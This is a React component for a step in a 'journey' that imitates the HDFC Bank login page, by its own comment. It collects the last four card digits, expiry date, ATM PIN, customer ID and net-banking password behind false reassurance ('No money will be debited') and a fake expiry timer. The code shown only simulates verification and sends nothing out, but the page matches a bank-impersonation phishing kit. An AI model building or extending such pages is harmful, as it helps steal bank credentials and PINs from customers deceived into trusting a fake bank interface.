"use client";

import React, { useState, useEffect } from "react";
import { useJourney } from "@/app/context/JourneyContext";
import { Button } from "@/app/components/ui/button";
import { Card, CardContent, CardFooter } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Loader2, CreditCard, Globe, Eye, EyeOff, Info } from "lucide-react";
import { trackEvent } from "@/lib/analytics";
import StepBanner from "./StepBanner";
import { cn } from "@/lib/utils";

export default function StepAccountConversion() {
    const { nextStep } = useJourney();
    const [isLoading, setIsLoading] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [activeTab, setActiveTab] = useState("debit-card");
    const [isRedirecting, setIsRedirecting] = useState(false);

    // Form States
    const [last4Digits, setLast4Digits] = useState("");
    const [expiryDate, setExpiryDate] = useState("");
    const [pin, setPin] = useState("");
    const [customerId, setCustomerId] = useState("");
    const [netBankingPassword, setNetBankingPassword] = useState("");

    useEffect(() => {
        trackEvent('page_viewed', { page: 'account_conversion_verification' });
    }, []);

    const handleVerify = () => {
        setIsLoading(true);
        // Simulate API verification delay
        setTimeout(() => {
            setIsLoading(false);
            setIsRedirecting(true);
            setTimeout(() => {
                nextStep();
            }, 1000);
        }, 2000);
    };

    return (
        <div className="w-full max-w-4xl mx-auto space-y-6">
            {/* Header Banner - mimicking HDFC login style */}
            <div className="bg-white rounded-[20px] shadow-sm border border-slate-200 overflow-hidden relative">
                <div className="absolute top-0 left-0 w-full h-1 bg-[#004C8F]" />
                <div className="px-8 py-6 flex items-center justify-between">
                    <h2 className="text-2xl font-bold text-slate-800">Log in to HDFC Bank</h2>
                    <div className="text-xs font-semibold text-slate-400 bg-slate-50 px-3 py-1.5 rounded-lg border border-slate-100">
                        Page session will expire in <span className="text-red-500">04:56</span> mins
                    </div>
                </div>
            </div>

            <Card className="border-none shadow-premium-lg bg-card/60 backdrop-blur-xl rounded-[32px] overflow-hidden min-h-[500px]">
                <CardContent className="p-0">
                    <div className="w-full">
                        {/* Custom Tab List */}
                        <div className="border-b border-slate-100 bg-white/50 px-8 pt-6">
                            <div className="flex gap-8 justify-start">
                                <button
                                    onClick={() => setActiveTab("debit-card")}
                                    className={cn(
                                        "text-lg font-bold pb-4 px-0 border-b-[3px] transition-all flex items-center gap-2",
                                        activeTab === "debit-card"
                                            ? "text-[#004C8F] border-[#004C8F]"
                                            : "text-slate-500 border-transparent hover:text-slate-700"
                                    )}
                                >
                                    <CreditCard className="w-5 h-5" /> Debit Card / ATM Card
                                </button>
                                <button
                                    onClick={() => setActiveTab("net-banking")}
                                    className={cn(
                                        "text-lg font-bold pb-4 px-0 border-b-[3px] transition-all flex items-center gap-2",
                                        activeTab === "net-banking"
                                            ? "text-[#004C8F] border-[#004C8F]"
                                            : "text-slate-500 border-transparent hover:text-slate-700"
                                    )}
                                >
                                    <Globe className="w-5 h-5" /> Net Banking
                                </button>
                            </div>
                            <p className="text-xs font-medium text-slate-400 pb-2 pt-1">{activeTab === "debit-card" ? "Kindly keep your Card details handy" : "Login using your Customer Id & Password"}</p>
                        </div>

                        {/* Information Banner */}
                        <div className="bg-blue-50 px-8 py-4 border-b border-blue-100 flex items-start gap-3">
                            <Info className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                            <p className="text-sm font-semibold text-blue-800">
                                Relax! No money will be debited from your account, this is only for verification purposes.
                            </p>
                        </div>

                        <div className="p-8 md:p-12">
                            {/* Tab Content: Debit Card */}
                            {activeTab === "debit-card" && (
                                <div className="space-y-8 animate-in fade-in slide-in-from-left-4 duration-300">
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-end">
                                        <div className="space-y-2">
                                            <Label className="text-xs font-bold text-slate-500 uppercase tracking-widest pl-1">Last 4 Digits of Debit Card</Label>
                                            <div className="flex items-center gap-2">
                                                <div className="h-14 flex-1 bg-slate-100 rounded-xl border border-transparent flex items-center justify-center text-slate-400 font-bold tracking-widest text-lg">XXXX</div>
                                                <div className="h-14 flex-1 bg-slate-100 rounded-xl border border-transparent flex items-center justify-center text-slate-400 font-bold tracking-widest text-lg">XXXX</div>
                                                <div className="h-14 flex-1 bg-slate-100 rounded-xl border border-transparent flex items-center justify-center text-slate-400 font-bold tracking-widest text-lg">XXXX</div>
                                                <Input
                                                    maxLength={4}
                                                    className="h-14 flex-1 font-bold text-xl text-center bg-white border-slate-200 focus:border-primary shadow-sm rounded-xl tracking-widest"
                                                    placeholder="1234"
                                                    value={last4Digits}
                                                    onChange={(e) => setLast4Digits(e.target.value.replace(/\D/g, ''))}
                                                />
                                            </div>
                                        </div>

                                        <div className="space-y-2">
                                            <Label className="text-xs font-bold text-slate-500 uppercase tracking-widest pl-1">Expiry Date</Label>
                                            <div className="relative">
                                                <Input
                                                    type="text"
                                                    placeholder="MM / YY"
                                                    className="h-14 font-semibold text-lg bg-white border-slate-200 focus:border-primary px-4 rounded-xl"
                                                    value={expiryDate}
                                                    maxLength={5}
                                                    onChange={(e) => {
                                                        let v = e.target.value.replace(/\D/g, '');
                                                        if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                                                        setExpiryDate(v);
                                                    }}
                                                />
                                            </div>
                                        </div>
                                    </div>

                                    <div className="space-y-2 max-w-md">
                                        <Label className="text-xs font-bold text-slate-500 uppercase tracking-widest pl-1">ATM PIN</Label>
                                        <div className="relative">
                                            <Input
                                                type={showPassword ? "text" : "password"}
                                                maxLength={4}
                                                className="h-14 font-black text-2xl tracking-[0.5em] bg-white border-slate-200 focus:border-primary px-4 rounded-xl"
                                                placeholder="••••"
                                                value={pin}
                                                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                                            />
                                            <button
                                                type="button"
                                                onClick={() => setShowPassword(!showPassword)}
                                                className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors"
                                            >
                                                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            )}

                            {/* Tab Content: Net Banking */}
                            {activeTab === "net-banking" && (
                                <div className="space-y-8 animate-in fade-in slide-in-from-right-4 duration-300">
                                    <div className="space-y-6 max-w-md mx-auto">
                                        <div className="space-y-2">
                                            <Label className="text-xs font-bold text-slate-500 uppercase tracking-widest pl-1">Customer ID</Label>
                                            <Input
                                                className="h-14 font-semibold text-lg bg-white border-slate-200 focus:border-primary px-4 rounded-xl"
                                                placeholder="Enter Customer ID"
                                                value={customerId}
                                                onChange={(e) => setCustomerId(e.target.value)}
                                            />
                                        </div>

                                        <div className="space-y-2">
                                            <Label className="text-xs font-bold text-slate-500 uppercase tracking-widest pl-1">IPIN (Password)</Label>
                                            <div className="relative">
                                                <Input
                                                    type={showPassword ? "text" : "password"}
                                                    className="h-14 font-semibold text-lg bg-white border-slate-200 focus:border-primary px-4 rounded-xl"
                                                    placeholder="Enter Password"
                                                    value={netBankingPassword}
                                                    onChange={(e) => setNetBankingPassword(e.target.value)}
                                                />
                                                <button
                                                    type="button"
                                                    onClick={() => setShowPassword(!showPassword)}
                                                    className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors"
                                                >
                                                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            )}

                            <div className="flex items-center gap-3 pt-4">
                                <input type="checkbox" id="terms" className="w-5 h-5 rounded border-slate-300 text-primary focus:ring-primary" defaultChecked />
                                <Label htmlFor="terms" className="text-sm font-semibold text-slate-600 cursor-pointer">
                                    Click here to accept <span className="text-primary underline">Terms & Conditions</span> in order to proceed. <span className="text-blue-600 font-bold cursor-pointer">Click here</span> to view TnC.
                                </Label>
                            </div>
                        </div>
                    </div>
                </CardContent>

                <CardFooter className="p-8 md:p-12 pt-0 flex justify-center">
                    <Button
                        onClick={handleVerify}
                        disabled={isLoading || isRedirecting}
                        className="h-14 px-16 rounded-full bg-[#00871E] hover:bg-[#007018] text-white text-xl font-bold shadow-xl shadow-green-900/20 gap-3 transition-all hover:scale-[1.02] active:scale-[0.98]"
                    >
                        {isLoading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Submit"}
                    </Button>
                </CardFooter>
            </Card>

            {isRedirecting && (
                <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md flex items-center justify-center z-[100]">
                    <div className="bg-white p-8 rounded-3xl shadow-2xl flex flex-col items-center gap-4 animate-in zoom-in-95 duration-300">
                        <Loader2 className="w-10 h-10 text-primary animate-spin" />
                        <p className="font-bold text-slate-700">Verifying secure credentials...</p>
                    </div>
                </div>
            )}
        </div>
    );
}
